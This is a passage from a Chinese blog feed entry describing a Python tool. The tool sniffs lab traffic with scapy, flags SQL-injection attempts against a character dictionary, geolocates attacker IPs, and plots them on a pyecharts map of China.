pygeoip.GeoIP(&apos;GeoLiteCity.dat&apos;)rec = gi.record_by_name(&quot;114.242.146.98&quot;)</code></pre><h3 id="态势地图的构建。"><a href="#态势地图的构建。" class="headerlink" title="态势地图的构建。"></a>态势地图的构建。</h3><pre><code>geo = Geo(&quot;SQL注入威胁感知&quot;, &quot;data from traffic&quot;, title_color=&quot;#fff&quot;, title_pos=&quot;left&quot;, width=1200, height=1000,          background_color=&apos;#404a59&apos;)data = { &quot;北京&quot;: &quot;beijing&quot;, &quot;上海&quot;:&quot;shanghai&quot;,&quot;深圳&quot;:&quot;shenzhen&quot;,&quot;广州&quot;:&quot;guangzhou&quot;,&quot;厦门&quot;:&quot;xiamen&quot;,&quot;郑州&quot;:&quot;zhengzhou&quot;,&quot;西安&quot;:&quot;xian&quot;,&quot;乌鲁木齐&quot;:&quot;wulumuqi&quot;,&quot;沈阳&quot;:&quot;shenyang&quot;,&quot;济南&quot;:&quot;jinan&quot;,         &quot;石家庄&quot;:&quot;shijiazhuang&quot;,&quot;哈尔滨&quot;:&quot;haerbing&quot;,&quot;成都&quot;:&quot;chengdu&quot;,&quot;昆明&quot;:&quot;kunming&quot;,&quot;武汉&quot;:&quot;wuhan&quot;,&quot;拉萨&quot;:&quot;lasa&quot;,&quot;南京&quot;:&quot;nanjing&quot;,         &quot;兰州&quot;:&quot;lanzhou&quot;,&quot;南宁&quot;:&quot;nanning&quot;,&quot;呼和浩特&quot;:&quot;huhehaote&quot;,&quot;海口&quot;:&quot;haikou&quot;,         &quot;贵阳&quot;:&quot;guiyang&quot;,&quot;西宁&quot;:&quot;xining&quot;,&quot;合肥&quot;:&quot;hefei&quot;,&quot;太原&quot;:&quot;taiyuan&quot;         }attr, value = geo.cast(data)geo.add(&quot;traffic analyze&quot;, attr, value, type=&quot;effectScatter&quot;, is_random=True, effect_scale=1)geo.render(path=&quot;map.html&quot;)</code></pre><h3 id="流量嗅探"><a href="#流量嗅探" class="headerlink" title="流量嗅探"></a>流量嗅探</h3><pre><code>sniff(filter=&apos;host 192.168.209.160&apos;, iface=&quot;VMware Virtual Ethernet Adapter for VMnet8&quot;, prn=test, count=0)</code></pre><h3 id="关于数据包"><a href="#关于数据包" class="headerlink" title="关于数据包"></a>关于数据包</h3><p>每一个协议层都是Packet类的子类。<br>协议层背后所有逻辑的操作都是被Packet类和继承的类所处理的。<br>一个简单的协议层是由一系列的字段构成，他们关联在一起组成了协议层，解析时拆分成一个一个的字符串。<br>这些字段都包含在名为fields_desc的属性中。</p><p>第一层是数据链路层，第二层是ip层，第三层是tcp层——&gt;包含端口号、http报文,第四层是应用层<br>其中每一层均为上一层的payload成员</p><pre><code># f.name为Raw的字段名称——&gt;load：传输的http请求信息fvalue = page.payload.payload.getfieldval(f.name)#请求相关字段的值</code></pre><h2 id="总体功能"><a href="#总体功能" class="headerlink" title="总体功能"></a>总体功能</h2><p>启动代码自动用火狐打开本地检测地图，嗅探指定网卡和指定过滤规则的流量并传入回调函数test，在回调函数test中进行数据的拆分，并对比特殊字符字典：sql.txt，将可疑流量进一步拆分，获取攻击者的IP、攻击时间、攻击的位置和payload以及提交方式，并记录到danger.log，日志中。在分析到可疑流量的时候将攻击者IP传递到printRecord函数利用GeoIP进行解析IP，进而获取到攻击者所在的城市、国家、经纬度和攻击次数并保存到数据库中，同时利用pyecharts生成Echarts中国地图，并提取数据库中的攻击者信息在地图上标记攻击者所在地点、IP和攻击次数，如果数据更新，则利用selenium模块中的webdriver动态覆盖并刷新地图。</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fy0v5m430kj30s40i5q47.jpg" alt=""></p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fy313y82wpj30w70pl0v5.jpg" alt=""></p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fy314nphr4j30ef07iwen.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;pre&gt;&lt;code&gt;from scapy.all import *
import re
import datetime
from pyecharts import Geo
import pygeoip
import pymysql
from selenium import we
      
    
    </summary>
    
      <category term="python脚本" scheme="http://yoursite.com/categories/python%E8%84%9A%E6%9C%AC/"/>
    
    
  </entry>
  
</feed>
